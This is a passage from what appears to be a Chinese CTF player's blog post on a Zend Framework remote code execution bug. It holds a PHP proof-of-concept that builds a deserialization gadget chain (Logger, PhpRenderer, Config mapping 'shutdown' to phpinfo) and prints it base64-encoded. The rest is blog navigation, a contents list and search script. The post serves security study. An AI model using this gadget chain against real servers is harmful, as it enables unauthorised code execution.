+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Zend</span>\<span class="title class_">View</span>\<span class="title class_">Renderer</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Zend</span>\<span class="title">Config</span>\<span class="title">Config</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PhpRenderer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;__helpers = <span class="keyword">new</span> <span class="title class_">Config</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Zend</span>\<span class="title class_">Config</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;shutdown&#x27;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Zend</span>\<span class="title class_">Log</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Zend</span>\<span class="title">View</span>\<span class="title">Renderer</span>\<span class="title">PhpRenderer</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$writers</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;writers = [<span class="keyword">new</span> <span class="title class_">PhpRenderer</span>()];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Logger</span>()));</span><br></pre></td></tr></table></figure>
+<p>但这里在网上找到的解读文章都不是很详尽……</p>
+<p>主要还是想学习一下 poc 的手法</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/07/17/hello-world/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-07-20 02:09:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                        <b>#</b> 代码审计
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/07/21/Vulnhub%EF%BC%9ASar-1/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-text"> 准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text"> 代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text"> EXP</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/ki10Moc/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="ki10Moc1949@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100083345720708">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ki10moc1/status/1494844731544662019?s=21&t=l-0lygAzRMHeJeBklnPt-A">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">Copyright © 2025 ki10Moc</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">霍布斯鲍姆学徒 | CTFer</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Zend%20FrameWork%20RCE1 + '&url=' + https%3A%2F%2Fki10moc.github.io%2F2022%2F07%2F20%2FZend%2520FrameWork%2520RCE1%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ki10moc.github.io/2022/07/20/Zend%20FrameWork%20RCE1/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
